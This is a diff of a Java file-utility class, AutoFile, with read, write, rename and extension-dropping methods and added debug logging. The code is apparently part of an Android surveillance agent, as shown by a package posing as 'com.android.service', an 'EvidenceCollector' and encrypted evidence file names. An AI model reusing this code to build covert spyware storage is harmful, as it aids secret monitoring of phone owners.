@@ -20,6 +20,7 @@ import java.io.OutputStream;
 import java.util.Date;
 
 import com.android.service.auto.Cfg;
+import com.android.service.evidence.EvidenceCollector;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -29,9 +30,10 @@ import com.android.service.util.Utils;
 public final class AutoFile {
 
 	/** The Constant TAG. */
-	private static final String TAG = "AutoFile";
+	private static final String TAG = "AutoFile"; //$NON-NLS-1$
 	/** The file. */
 	File file;
+	private String filename;
 
 	/**
 	 * Instantiates a new auto flash file.
@@ -43,11 +45,12 @@ public final class AutoFile {
 	 */
 	public AutoFile(final String filename) {
 		file = new File(filename);
-		// this.filename = filename;
+		this.filename = filename;
 	}
 
 	public AutoFile(String dir, String filename) {
 		file = new File(dir, filename);
+		this.filename = filename;
 	}
 
 	/**
@@ -77,7 +80,7 @@ public final class AutoFile {
 			return buffer;
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e) ;//$NON-NLS-1$
 			}
 
 		} finally {
@@ -86,7 +89,7 @@ public final class AutoFile {
 					in.close();
 				} catch (final IOException e) {
 					if (Cfg.DEBUG) {
-						Check.log(e);
+						Check.log(e) ;//$NON-NLS-1$
 					}
 				}
 			}
@@ -131,8 +134,9 @@ public final class AutoFile {
 				try {
 					out.close();
 				} catch (final IOException e) {
-					if (Cfg.DEBUG)
-						Check.log(TAG + " Error: " + e.toString());
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " Error: " + e.toString()) ;//$NON-NLS-1$
+					}
 				}
 			}
 		}
@@ -171,7 +175,7 @@ public final class AutoFile {
 	}
 
 	/**
-	 * Checks if the file is a directory.
+	 * Check. if the file is a directory. //$NON-NLS-1$
 	 * 
 	 * @return true, if is directory
 	 */
@@ -185,8 +189,9 @@ public final class AutoFile {
 	 * @return the string[]
 	 */
 	public String[] list() {
-		if (Cfg.DEBUG)
-			Check.asserts(isDirectory(), "Should be a directory");
+		if (Cfg.DEBUG) {
+			Check.asserts(isDirectory(), "Should be a directory"); //$NON-NLS-1$
+		}
 		return file.list();
 	}
 
@@ -208,6 +213,10 @@ public final class AutoFile {
 		return new Date(file.lastModified());
 	}
 
+	public String getFilename(){
+		return filename;
+	}
+	
 	/**
 	 * Flush.
 	 */
@@ -223,18 +232,23 @@ public final class AutoFile {
 		file.delete();
 	}
 
-	public void dropExtension(String ext) {
-		String filename = file.getName();
-		int pos = filename.lastIndexOf(ext);
-		String newname = filename.substring(0, pos);
-		File newfile = new File(file.getParent(), newname);
-		boolean ret = file.renameTo(newfile);
+	public boolean dropExtension(String ext) {
+		final String filename = file.getName();
+		final int pos = filename.lastIndexOf(ext);
+		final String newname = filename.substring(0, pos);
+		final File newfile = new File(file.getParent(), newname);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (dropExtension): " + EvidenceCollector.decryptName(filename) + " -> " +EvidenceCollector.decryptName(newname));
+		}
+		final boolean ret = file.renameTo(newfile);
+		return ret;
 	}
 
 	public void create() {
 		write(new byte[0]);
-		if (Cfg.DEBUG)
-			Check.ensures(file.exists(), "Non existing files");
+		if (Cfg.DEBUG) {
+			Check.ensures(file.exists(), "Non existing files"); //$NON-NLS-1$
+		}
 	}
 
 	public void write(String string) {
@@ -247,21 +261,24 @@ public final class AutoFile {
 
 	public boolean rename(String newfilename) {
 		try {
-			File newfile = new File(newfilename);
+			final File newfile = new File(newfilename);
 			if (newfile.exists()) {
 				newfile.delete();
 			}
 
 			file.renameTo(newfile);
-			
-			if (Cfg.DEBUG) Check.asserts(newfile.exists(),"rename");
-			
-		} catch (Exception ex) {
-			if(Cfg.DEBUG) Check.log(ex);
+
+			if (Cfg.DEBUG) {
+				Check.asserts(newfile.exists(), "rename"); //$NON-NLS-1$
+			}
+
+		} catch (final Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(ex) ;//$NON-NLS-1$
+			}
 			return false;
 		}
 
-		
 		return true;
 	}
 }
